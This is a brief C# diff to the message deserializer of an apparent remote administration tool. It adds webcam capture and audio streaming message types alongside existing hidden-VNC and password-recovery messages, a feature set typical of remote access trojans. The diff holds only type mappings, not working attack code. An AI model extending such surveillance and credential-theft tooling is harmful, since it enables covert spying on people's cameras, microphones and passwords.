@@ -186,6 +186,14 @@ namespace RemoteAdmin.Shared
                 "HvncLaunchBrowser" => JsonSerializer.Deserialize<HvncLaunchBrowserMessage>(json),
                 "PasswordRecoveryRequest" => JsonSerializer.Deserialize<PasswordRecoveryRequestMessage>(json),
                 "PasswordRecoveryResponse" => JsonSerializer.Deserialize<PasswordRecoveryResponseMessage>(json),
+                "StartWebcam" => JsonSerializer.Deserialize<StartWebcamMessage>(json),
+                "StopWebcam" => JsonSerializer.Deserialize<StopWebcamMessage>(json),
+                "WebcamFrame" => JsonSerializer.Deserialize<WebcamFrameMessage>(json),
+                "GetWebcamList" => JsonSerializer.Deserialize<GetWebcamListMessage>(json),
+                "WebcamList" => JsonSerializer.Deserialize<WebcamListMessage>(json),
+                "StartAudioStream" => JsonSerializer.Deserialize<StartAudioStreamMessage>(json),
+                "StopAudioStream" => JsonSerializer.Deserialize<StopAudioStreamMessage>(json),
+                "AudioChunk" => JsonSerializer.Deserialize<AudioChunkMessage>(json),
                 _ => throw new Exception($"Unknown message type: {messageType}")
             };
         }
